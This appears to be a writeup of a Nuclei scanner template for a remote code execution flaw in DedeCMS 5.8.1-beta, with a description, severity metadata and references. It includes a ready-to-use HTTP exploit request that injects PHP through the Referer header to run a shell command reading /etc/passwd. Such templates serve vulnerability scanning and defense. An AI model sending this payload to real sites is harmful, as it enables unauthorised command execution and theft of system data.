# Nuclei Template: DedeCMS 5.8.1-beta - Remote Code Execution
**Template ID:** dedecms-rce
**Vulnerability Class:** OS Command Injection
**Severity:** Critical
**CWE:** CWE-78
**Source:** Nuclei Template (`dedecms-rce.yaml`)

## Vulnerability Information & PoC

## Description
DedeCMS 5.8.1-beta is susceptible to remote code execution via a variable override vulnerability that allows an attacker to construct malicious code with template file inclusion without proper authorization, thus possibly obtaining sensitive information, modifying data, and/or gaining full control over a compromised system without entering necessary credentials.

## Steps to reproduce / Exploit Payload
```http
GET /plus/flink.php?dopost=save&c=cat%20/etc/passwd HTTP/1.1
Host: {{Hostname}}
Referer: <?php "system"($c);die;/*ref
```

## References
- https://srcincite.io/blog/2021/09/30/chasing-a-dream-pwning-the-biggest-cms-in-china.html
- https://sectime.top/post/1d114771.html
